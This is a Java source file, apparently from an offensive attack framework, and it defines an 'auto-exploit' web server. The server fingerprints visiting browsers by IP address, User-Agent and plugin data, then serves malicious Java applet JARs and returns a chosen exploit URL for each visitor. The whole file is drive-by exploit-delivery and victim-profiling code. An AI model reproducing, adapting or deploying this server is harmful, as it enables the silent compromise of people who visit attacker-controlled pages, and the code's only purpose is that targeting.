package profiler;

import cloudstrike.Response;
import cloudstrike.WebServer;

import java.io.ByteArrayInputStream;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;

public class AutoExploit
        extends SystemProfiler {
    protected ExploitListener exploith = null;
    protected String classa;
    protected String classb;
    protected byte[] jara;
    protected byte[] jarb;
    protected String jobs;
    protected String wdata = "";
    protected byte[] jdata = new byte[0];

    public void setExploitListener(ExploitListener l) {
        this.exploith = l;
    }

    public AutoExploit(String jobs, String classa, byte[] jara, String classb, byte[] jarb) {
        this.classa = classa;
        this.classb = classb;
        this.jara = jara;
        this.jarb = jarb;
        this.jobs = jobs;
        this.init();
    }

    @Override
    public String toString() {
        return "auto-exploit server";
    }

    @Override
    public String getType() {
        return "auto-exploit";
    }

    public void setup(WebServer server, String uri, String wdata, byte[] jdata) {
        this.wdata = wdata;
        this.jdata = jdata;
        server.registerSecondary("/locate", this);
        server.registerSecondary("/check.js", this);
        server.register(uri, this);
        server.registerSecondary("/java/iecheck.class", this);
        server.registerSecondary("/a/applet.html", this);
        server.registerSecondary("/b/applet.html", this);
        server.registerSecondary("/a/support", this);
        server.registerSecondary("/b/support", this);
        server.registerSecondary("/a/applet.jar", this);
        server.registerSecondary("/b/applet.jar", this);
    }

    @Override
    public List cleanupJobs() {
        LinkedList<String> rv = new LinkedList<>();
        String[] j = this.jobs.split(" ");
        for (String aJ : j) {
            rv.add(aJ);
        }
        return rv;
    }

    public void init() {
        try {
            StringBuilder javascript = new StringBuilder(1000);
            AutoExploit.suckItDown("/resources/jquery-1.7.1.min.js", javascript);
            AutoExploit.suckItDown("/resources/deployJava.js", javascript);
            AutoExploit.suckItDown("/resources/reader.js", javascript);
            StringBuilder html = new StringBuilder(1000);
            AutoExploit.suckItDown("/resources/autoexploit.js", javascript);
            AutoExploit.suckItDown("/resources/auto.html", html);
            this.my_js = javascript.toString();
            this.my_html = html.toString();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public String resource(String resource, String applet_clazz) {
        StringBuilder temp = new StringBuilder(524288);
        try {
            SystemProfiler.suckItDown(resource, temp);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return temp.toString().replace("%JAR_URI%", "applet.jar").replace("%DATA%", this.wdata).replace("%CLASS%", applet_clazz).replace("%LIB_URI%", "support");
    }

    @Override
    public boolean suppressEvent(String uri) {
        return "/locate".equals(uri);
    }

    @Override
    public Response serve(String uri, String method, Properties header, Properties param) {
        if ("/a/applet.jar".equals(uri)) {
            return new Response("200 OK", "application/java-archive", new ByteArrayInputStream(this.jara));
        }
        if ("/b/applet.jar".equals(uri)) {
            return new Response("200 OK", "application/java-archive", new ByteArrayInputStream(this.jarb));
        }
        if ("/a/support".equals(uri) || "/b/support".equals(uri)) {
            return new Response("200 OK", "application/java-archive", new ByteArrayInputStream(this.jdata));
        }
        if ("/a/applet.html".equals(uri)) {
            return new Response("200 OK", "text/html", this.resource("/resources/applet.html", this.classa));
        }
        if ("/b/applet.html".equals(uri)) {
            return new Response("200 OK", "text/html", this.resource("/resources/applet.html", this.classb));
        }
        if (uri.equals("/locate")) {
            String who = header.get("REMOTE_ADDRESS") + "";
            if (who.length() > 1) {
                who = who.substring(1);
            }
            Map results = this.parseResults(header.get("User-Agent") + "", param.get("data") + "");
            for (Object listener : this.listeners) {
                ProfileListener l = (ProfileListener) listener;
                l.receivedProfile(who, param.get("from") + "", header.get("User-Agent") + "", results, param.get("id") + "");
            }
            String url = this.exploith.exploitRecommend(who, header.get("User-Agent") + "", results, param.get("id") + "", param.get("from") + "");
            return new Response("200 OK", "text/plain", url);
        }
        return super.serve(uri, method, header, param);
    }

    public interface ExploitListener {
        String exploitRecommend(String var1, String var2, Map var3, String var4, String var5);
    }

}

